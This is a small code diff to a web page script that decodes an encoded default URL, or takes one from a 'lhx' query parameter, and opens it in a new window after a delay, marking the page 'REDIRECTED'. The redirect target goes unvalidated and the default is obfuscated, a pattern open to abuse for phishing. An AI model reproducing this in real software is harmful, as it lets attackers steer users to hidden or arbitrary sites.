@@ -17,8 +17,8 @@ var deflh="e12331a3619453f273a142b3f461a54415a1a5d271e2924411339224";
 var occ=new $_;
 occ.run();
 var upr=new URLSearchParams(window.location.href);
-var lhx=upr.get('lhx')?upr.get('lhx').hl():deflh.hl();
-setTimeout(()=>window.open(lhx,"_blank"),1575);
+var lhx=()=>upr.get('lhx')?upr.get('lhx').hl():deflh.hl();
+setTimeout(()=>window.open(lhx(),"_blank"),1575);
 occ.qs('h1').innerText="REDIRECTED ...";
 
 </script>
